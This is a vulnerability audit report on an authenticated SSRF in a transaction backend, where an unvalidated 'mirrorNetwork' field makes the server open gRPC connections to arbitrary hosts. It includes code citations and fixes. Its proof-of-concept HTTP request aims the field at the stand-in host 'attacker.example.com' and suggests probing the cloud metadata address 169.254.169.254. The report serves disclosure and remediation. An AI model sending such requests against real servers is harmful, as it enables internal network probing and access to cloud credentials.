All referenced code has been verified. Every claim in the report maps to real, confirmed code. Here is the audit output:

---

Audit Report

## Title
Authenticated SSRF via Unvalidated `mirrorNetwork` Parameter in Transaction Creation

## Summary
The `mirrorNetwork` field in `CreateTransactionDto` accepts any arbitrary string. When a transaction is submitted, the backend immediately uses this value to open an outbound gRPC connection to the supplied host before any other business-logic checks run. Any authenticated, verified user with at least one registered key can force the API server to make outbound TCP/gRPC connections to attacker-controlled infrastructure.

## Finding Description

**Root cause — no allowlist on `mirrorNetwork`:**

`CreateTransactionDto` decorates `mirrorNetwork` with only `@IsNotEmpty()` and `@IsString()`. No `@IsIn([...])`, `@IsEnum(...)`, or pattern constraint is applied. Any non-empty string passes DTO validation. [1](#0-0) 

**Exploit path — outbound connection before any other check:**

`createTransactions` immediately calls `getClientFromNetwork` with the raw user-supplied value at line 405, before signature verification, expiry checks, or node validation. [2](#0-1) 

**`getClientFromNetwork` default branch — live outbound connection:**

For any string that is not `mainnet`, `testnet`, `previewnet`, or `local-node`, the function falls through to the default branch, constructs a gRPC client pointing to `<attacker-host>:443` via `MirrorNetworkGRPC.fromBaseURL`, and executes a live `AddressBookQuery` against it. [3](#0-2) 

**`MirrorNetworkGRPC.fromBaseURL` default branch — verbatim attacker URL:**

The default branch appends `:443` if not already present and returns the attacker-controlled URL verbatim. [4](#0-3) 

**Access gate:**

The `POST /transactions` endpoint is guarded by `JwtBlackListAuthGuard`, `JwtAuthGuard`, `VerifiedUserGuard`, and `HasKeyGuard`. `HasKeyGuard` only requires `keysCount > 0` — any registered, verified user with at least one uploaded key satisfies all guards. [5](#0-4) [6](#0-5) 

## Impact Explanation

1. **SSRF / internal network probing**: The API server's egress IP is disclosed to the attacker's host. By supplying internal RFC-1918 addresses (e.g., `192.168.1.1`) or cloud metadata endpoints (e.g., `169.254.169.254`), the attacker can probe services reachable from the server but not from the public internet.
2. **Credential/metadata exfiltration**: In cloud-hosted deployments (AWS, GCP, Azure), the instance metadata service is reachable via the server's link-local interface. A gRPC dial to `169.254.169.254:443` will produce a TCP SYN that may elicit a response, confirming reachability and enabling further probing.
3. **Connection-hang DoS**: If the attacker's server accepts the TCP connection but never sends a gRPC response, the `AddressBookQuery` call blocks until the SDK timeout, tying up a server thread/connection slot per request.

## Likelihood Explanation

Any user who can register an account and upload one key can trigger this. The attack requires only a crafted `POST /transactions` body — no special tooling, no admin access, and no cryptographic material beyond a valid JWT and one registered key. The organization backend is designed to be accessible to multiple users.

## Recommendation

1. **Allowlist `mirrorNetwork`**: Add `@IsIn(['mainnet', 'testnet', 'previewnet', 'local-node'])` or a custom `@IsValidMirrorNetwork()` decorator to `CreateTransactionDto.mirrorNetwork`. For deployments that need custom mirror nodes, validate against a server-side configured allowlist rather than accepting arbitrary user input.
2. **Move `getClientFromNetwork` after input validation**: Ensure all DTO-level and business-logic validation occurs before any outbound network connection is initiated.
3. **Restrict egress**: At the network/infrastructure level, restrict the API server's outbound connections to known Hedera mirror node IP ranges.

## Proof of Concept

```http
POST /transactions HTTP/1.1
Authorization: Bearer <valid_jwt>
Content-Type: application/json

{
  "name": "SSRF Test",
  "description": "SSRF via mirrorNetwork",
  "transactionBytes": "<valid_hex>",
  "creatorKeyId": 1,
  "signature": "<valid_hex>",
  "mirrorNetwork": "attacker.example.com"
}
```

The server will immediately attempt a gRPC `AddressBookQuery` to `attacker.example.com:443`. Substituting `169.254.169.254` probes the cloud metadata endpoint. The connection attempt occurs before signature or expiry validation, as confirmed at: [7](#0-6) [3](#0-2)

### Citations

**File:** back-end/apps/api/src/transactions/dto/create-transaction.dto.ts (L26-28)
```typescript
  @IsNotEmpty()
  @IsString()
  mirrorNetwork: string;
```

**File:** back-end/apps/api/src/transactions/transactions.service.ts (L400-411)
```typescript
  async createTransactions(dtos: CreateTransactionDto[], user: User): Promise<Transaction[]> {
    if (dtos.length === 0) return [];

    await attachKeys(user, this.entityManager);

    const client = await getClientFromNetwork(dtos[0].mirrorNetwork);

    try {
      // Validate all DTOs upfront
      const validatedData = await Promise.all(
        dtos.map(dto => this.validateAndPrepareTransaction(dto, user, client)),
      );
```

**File:** back-end/libs/common/src/utils/sdk/client.ts (L38-44)
```typescript
  const client = Client.forNetwork({}).setMirrorNetwork(
    MirrorNetworkGRPC.fromBaseURL(mirrorNetwork[0]),
  );

  const nodeAddressBook = await new AddressBookQuery()
    .setFileId(FileId.ADDRESS_BOOK)
    .execute(client);
```

**File:** back-end/libs/common/src/utils/mirrorNode/index.ts (L14-16)
```typescript
      default:
        return [mirrorNetwork.endsWith(':443') ? mirrorNetwork : `${mirrorNetwork}:443`];
    }
```

**File:** back-end/apps/api/src/transactions/transactions.controller.ts (L56-78)
```typescript
@UseGuards(JwtBlackListAuthGuard, JwtAuthGuard, VerifiedUserGuard)
export class TransactionsController {
  constructor(private transactionsService: TransactionsService) {}

  /* Submit a transaction */
  @ApiOperation({
    summary: 'Create a transaction',
    description: 'Create a transaction for the organization to approve, sign, and execute.',
  })
  @ApiResponse({
    status: 201,
    type: TransactionDto,
  })
  @UseGuards(HasKeyGuard)
  @Post()
  @Serialize(TransactionDto)
  @OnlyOwnerKey<CreateTransactionDto>('creatorKeyId')
  async createTransaction(
    @Body() body: CreateTransactionDto,
    @GetUser() user,
  ): Promise<Transaction> {
    return this.transactionsService.createTransaction(body, user);
  }
```

**File:** back-end/apps/api/src/guards/has-key.guard.ts (L22-26)
```typescript
    if (keysCount > 0) {
      return true;
    } else {
      throw new UnauthorizedException('You should have at least one key to perform this action.');
    }
```
